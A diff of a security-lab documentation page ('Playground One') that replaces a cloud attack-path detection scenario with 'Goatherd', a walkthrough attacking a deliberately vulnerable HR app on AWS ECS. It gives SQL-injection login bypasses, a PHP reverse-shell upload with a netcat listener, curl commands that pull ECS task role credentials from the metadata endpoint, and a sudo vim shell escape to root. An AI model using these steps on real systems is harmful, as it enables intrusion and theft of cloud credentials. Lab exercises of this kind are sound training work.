@@ -9,10 +9,6 @@
       
       
       
-        <link rel="prev" href="../../cspm/template-scanning-cfn-github-action/">
-      
-      
-        <link rel="next" href="../iam-user-attack-path/">
       
       
       <link rel="icon" href="../../../images/playground-icon.png">
@@ -20,7 +16,7 @@
     
     
       
-        <title>Virtual Instance Potential Attack Path - Playground One</title>
+        <title>Scenario: Goatherd - Playground One</title>
       
     
     
@@ -74,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#scenario-asrm-to-detect-potential-attack-path-to-rds-via-ec2" class="md-skip">
+        <a href="#scenario-goatherd" class="md-skip">
           Skip to content
         </a>
       
@@ -110,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Virtual Instance Potential Attack Path
+              Scenario: Goatherd
             
           </span>
         </div>
@@ -665,21 +661,19 @@
       
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
         
           
           <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
@@ -693,7 +687,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             Scenarios
@@ -1157,21 +1151,19 @@
                 
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_5" >
         
           
           <label class="md-nav__link" for="__nav_5_5" id="__nav_5_5_label" tabindex="0">
@@ -1185,7 +1177,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5_5">
             <span class="md-nav__icon md-icon"></span>
             Attack Surface Risk Management
@@ -1196,30 +1188,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Virtual Instance Potential Attack Path
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../asrm/virtual-machine-attack-path/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1228,53 +1200,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#prerequisites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Prerequisites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#setup" class="md-nav__link">
-    <span class="md-ellipsis">
-      Setup
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tear-down" class="md-nav__link">
-    <span class="md-ellipsis">
-      Tear Down
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1287,7 +1212,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../iam-user-attack-path/" class="md-nav__link">
+      <a href="../../asrm/iam-user-attack-path/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1587,20 +1512,35 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#setup" class="md-nav__link">
+  <a href="#disclaimer" class="md-nav__link">
     <span class="md-ellipsis">
-      Setup
+      Disclaimer
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#tear-down" class="md-nav__link">
+  <a href="#exploiting" class="md-nav__link">
     <span class="md-ellipsis">
-      Tear Down
+      Exploiting
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Exploiting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1619,66 +1559,160 @@
                   
 
 
-<h1 id="scenario-asrm-to-detect-potential-attack-path-to-rds-via-ec2">Scenario: ASRM to detect Potential Attack Path to RDS via EC2<a class="headerlink" href="#scenario-asrm-to-detect-potential-attack-path-to-rds-via-ec2" title="Permanent link">&para;</a></h1>
+<h1 id="scenario-goatherd">Scenario: Goatherd<a class="headerlink" href="#scenario-goatherd" title="Permanent link">&para;</a></h1>
 <h2 id="prerequisites">Prerequisites<a class="headerlink" href="#prerequisites" title="Permanent link">&para;</a></h2>
 <ul>
-<li>AWS Cloud Account integrated with Vision One</li>
+<li>Vision One connected to your AWS Account</li>
+<li>Playground One Goat</li>
 </ul>
-<div class="admonition danger">
-<p class="admonition-title">Insecure Configuration</p>
-<p>Playing through this scenario requires the Playground One to be
-configured insecurely. This is because one of the AWS EC2 Security
-Groups will be configured to <code>0.0.0.0/0</code> inbound rules. Depending
-on the governance restrictions you need to comply with you might
-receive a (friendly) notification. </p>
-</div>
-<p>Ensure to have the Playground One Network up and running:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Network configuration</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>pgo<span class="w"> </span>--apply<span class="w"> </span>network
+<p>Ensure to have an ECS Cluster up and running:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pgo<span class="w"> </span>--apply<span class="w"> </span>goat
 </code></pre></div>
-<h2 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h2>
-<p>The Playground One configuration for EC2 (<code>ec2</code> or <code>instances</code>) creates two Linux servers when enabled in the config tool. The one of interest is the <code>db1</code> instance since it get's an instance profile assigned which allows read access to RDS. Contrary to all other instances this instance will use a dedicated security group which is open to the internet using the CIDR block <code>0.0.0.0/0</code>.</p>
-<p>Verify, that you have <code>EC2 - create Linux EC2</code>, <code>EC2 - create RDS Database</code> and <code>Vision One ASRM - create Potential Attack Path(s)</code> enabled in your configuration.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pgo<span class="w"> </span>--config
+<p>Ensure to have Runtime Security enabled on the Vision One Console for this cluster.</p>
+<h2 id="disclaimer">Disclaimer<a class="headerlink" href="#disclaimer" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong><em>Note:</em></strong> It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>
+</blockquote>
+<h2 id="exploiting">Exploiting<a class="headerlink" href="#exploiting" title="Permanent link">&para;</a></h2>
+<p>First, retrieve the load balancer DNS name</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pgo<span class="w"> </span>-o<span class="w"> </span>goat
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>...
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>EC2<span class="w"> </span>-<span class="w"> </span>create<span class="w"> </span>Linux<span class="w"> </span>EC2<span class="w"> </span><span class="o">[</span>true<span class="o">]</span>:
-<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>...
-<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>EC2<span class="w"> </span>-<span class="w"> </span>create<span class="w"> </span>RDS<span class="w"> </span>Database<span class="w"> </span><span class="o">[</span>true<span class="o">]</span>:<span class="w"> </span>
-<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>...
-<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Vision<span class="w"> </span>One<span class="w"> </span>ASRM<span class="w"> </span>-<span class="w"> </span>create<span class="w"> </span>Potential<span class="w"> </span>Attack<span class="w"> </span>Path<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="o">[</span>true<span class="o">]</span>:
-<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>...
+<p>Example output with ECS EC2:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">target_2_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;pgo-alb-qqrpqokp-1741705218.eu-central-1.elb.amazonaws.com:80/login.php&quot;</span>
 </code></pre></div>
-<p>A (free-tier) PostgreSQL dabase is automatically created when applying the configuration. It is not actively used but required to have a target in the potential attack path.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># With Potential Attack Path enabled</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>pgo<span class="w"> </span>--apply<span class="w"> </span>network
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># With Linux machines enabled</span>
-<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>pgo<span class="w"> </span>--apply<span class="w"> </span>instances
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<p><strong><em>SQL Injection</em></strong></p>
+<ul>
+<li>
+<p>Now, we can find <strong>Email</strong> as an injection point to perform the SQLi.</p>
+<p><img alt="" src="../images/goat-module-2-01.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="s1">&#39; or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="err">&#39;</span><span class="o">#</span>
 </code></pre></div>
-<p>The Linux instances are detected by Vision One ASRM after some time when you configured your CAM stack properly. The full analysis which should lead to a potential attack path for the <code>db1</code> instance as seen in the below screenshot can take up to 48hs.</p>
-<p><img alt="alt text" src="../images/asrm-ec2-attack-path-v2-01.png" title="Risk Detection" /></p>
-<p>As we can see, there is a high risk EC2 instance listed with a risk score of 72. Following the link of <code>i-0726e545c73222cbf</code> will explain us the cause of the risk rating. The instance is detected as an Internet-Facin EC2 instance with unrestricted Access.</p>
-<p>Additionally, the full potential attack path is shown in the lower half of the screen. It shows that one might be able to reach out to an RDS instance due to the assigned IAM instance role.</p>
-<p><img alt="alt text" src="../images/asrm-ec2-attack-path-v2-02.png" title="Attack Path" /></p>
-<p>Navigating to the tab <code>Asset Risk Graph</code> creates a graphical representaion on the currently inspected asset. The instance of interest is the in grey highlighted one. On it's right the EC2 instance role granting database access is shown.</p>
-<p>One can easily review the all the dependencies of this instance such as who can access the instance and why, the assigned security group and mounted volumes.</p>
-<p><img alt="alt text" src="../images/asrm-ec2-attack-path-v2-03.png" title="Asset Graph" /></p>
-<p>The Asset Profile presents detailed information about the asset such as Region, Availability zone, VPC ID, Public IP, architecture, and tags. Based on the analyses of Vision One, this instance is of Medium criticality. Depending on it's business relevance this could be easily adapted, if required.</p>
-<p><img alt="alt text" src="../images/asrm-ec2-attack-path-v2-05.png" title="Asset Profile" /></p>
-<p>Going back to <code>Attack Surface Discovery --&gt; Cloud Assets</code> followed by enabling the <code>Cloud Risk Graph</code> in the top right we can use the region view, in this case <code>eu-central-1</code> to let Vision One visually present us a high level view on what is deployed in the region of interest. The highlighted subnet <code>subnet-03930b609d1dbc4cd</code> indicates that an EC2 with a high risk score of 72 exists in it.</p>
-<p><img alt="alt text" src="../images/asrm-ec2-attack-path-v2-06.png" title="Region View" /></p>
-<p>🎉 Success 🎉</p>
-<h2 id="tear-down">Tear Down<a class="headerlink" href="#tear-down" title="Permanent link">&para;</a></h2>
-<p>At minimum, disable <code>Vision One ASRM - create Potential Attack Path(s)</code> in your configuration.</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>pgo<span class="w"> </span>--config
+</li>
+<li>
+<p>As we can see, there is a front-end check for the <strong>Email</strong> field. To get around that, we need to change the input field's type from <strong>email</strong> to <strong>text</strong> and then perform the injection. This should work if there is no backend email verification.</p>
+<p><img alt="" src="../images/goat-module-2-02.png" /></p>
+<p><img alt="" src="../images/goat-module-2-03.png" /></p>
+</li>
+<li>
+<p><strong>Voila! we are into the application!</strong></p>
+<p><img alt="" src="../images/goat-module-2-04.png" /></p>
+</li>
+</ul>
+<p><strong><em>SQL Injection with different user</em></strong></p>
+<ul>
+<li>
+<p>We can assume that the users table has a column named 'id'. An admin likely has the lowest user id. So try</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="s1">&#39;or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">DESC</span><span class="o">#</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>...
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Vision<span class="w"> </span>One<span class="w"> </span>ASRM<span class="w"> </span>-<span class="w"> </span>create<span class="w"> </span>Potential<span class="w"> </span>Attack<span class="w"> </span>Path<span class="o">(</span>s<span class="o">)</span><span class="w"> </span><span class="o">[</span>true<span class="o">]</span>:<span class="w"> </span><span class="nb">false</span>
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>...
+</li>
+<li>
+<p>This will put the user with the smallest id to the end of the select query and will therefore be used for authentication.</p>
+</li>
+<li>
+<p>When dumping all the table rows the SQL LIMIT clause can be helpful to control the number of rows returned by SQL. Let's use the payload below: </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="s1">&#39;or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">#</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>pgo<span class="w"> </span>--apply<span class="w"> </span>network
+</li>
+<li>
+<p>In this case we are a user with a manager role capable to upload payslips.</p>
+</li>
+</ul>
+<p><strong><em>Upload PHP reverse shell</em></strong></p>
+<ul>
+<li>
+<p>Create an EC2 instance with a public IP, connect to it and start netcat with <code>nc -nlvp 45678</code></p>
+</li>
+<li>
+<p>Head over to Payslips and upload the php file for the user Mark. Be sure to adapt the IP in the beginning of the php file so that it points to your server from above.</p>
+</li>
+<li>
+<p>Logout and relogin with SQLi using</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="s1">&#39;or &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="err">&#39;</span><span class="o">#</span>
 </code></pre></div>
+</li>
+<li>
+<p>You are now Mark and are checking for new payslips. Choose the one with the highest ID. This should trigger the PHP reverse shell.</p>
+</li>
+<li>
+<p>Head over to your EC2 instance and interact with the shell running in your ECS container task.</p>
+</li>
+</ul>
+<p><strong><em>Recon</em></strong></p>
+<ul>
+<li>
+<p>When running <code>id</code> we see, that we're not root but <code>www-data</code>, sadly.</p>
+</li>
+<li>
+<p>Let's start by printing out the <strong>Environment Variables</strong></p>
+<p>```console
+printenv
+````</p>
+</li>
+<li>
+<p>We can ascertain a lot of information from the environment variables. From the <code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>, it is evident that we have a shell inside a container. From the <code>AWS_EXECUTION_ENV</code>, it is evident we are in an ECS container that is running on an EC2 instance host. Also from the <code>RDS_ENDPOINT</code> we can assume the application is using the <strong>RDS</strong> service.</p>
+<p><img alt="" src="../images/goat-module-2-05.png" /></p>
+</li>
+<li>
+<p>Now, run the below command to get the ECS container's metadata.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="go">curl http://172.17.0.1:51678/v1/metadata</span>
+</code></pre></div>
+<p><img alt="" src="../images/goat-module-2-06.png" /></p>
+</li>
+<li>
+<p>On examining the output, we can find that the target application is running on a <strong>Container Instance</strong>. From the <code>ContainerInstanceArn</code> we have found the aws accounts' information where the HR application is deployed.</p>
+</li>
+<li>
+<p>Containers in AWS Elastic Container Service (ECS) are run using <code>tasks</code> and tasks have a role assigned to them that is passed on to the ECS Containers. Since we've already established that the application is running on an ECS container, let's try to get it's <strong>AWS Role</strong> Credentials by running the below command.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="go">curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</span>
+</code></pre></div>
+</li>
+<li>
+<p>Voila! We obtained <strong>Container Credentials</strong>.</p>
+<p><img alt="" src="../images/goat-module-2-07.png" /></p>
+</li>
+<li>
+<p>When running <code>id</code> we see, that we're not root, sadly.</p>
+</li>
+</ul>
+<p><strong><em>Escalating Privilege to root user</em></strong></p>
+<ul>
+<li>
+<p>We can try to switch to root:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo<span class="w"> </span>su
+</code></pre></div>
+</li>
+<li>
+<p>But we can't do that</p>
+</li>
+<li>
+<p>We can try to list commands that we are allowed to run as superuser on the host.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>sudo<span class="w"> </span>-l
+</code></pre></div>
+</li>
+<li>
+<p>The current user can run vim on the /var/www/html/documents directory as root without using a password. This can allow us to escalate our privileges as vim in itself does feature an internal command line executor.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/vim<span class="w"> </span>/var/www/html/documents
+</code></pre></div>
+</li>
+<li>
+<p>Now we can try to get root access by running vim on the <code>/var/www/html/documents</code> directory with root privileges using the following command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sudo<span class="w"> </span>/usr/bin/vim<span class="w"> </span>/var/www/html/documents
+</code></pre></div>
+</li>
+<li>
+<p>Here we can try to spawn a shell through vims' internal command line executor by using the command after pressing the <escape> key:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">:!</span> <span class="sr">/bin/</span><span class="k">sh</span>
+</code></pre></div>
+</li>
+<li>
+<p>We haven't come across an error, and have spawned a new shell. Run the below-mentioned commands to check if we have escalated our privileges.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>whoami
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>id
+</code></pre></div>
+</li>
+</ul>
+<p><em>More to come</em></p>
 
 
 
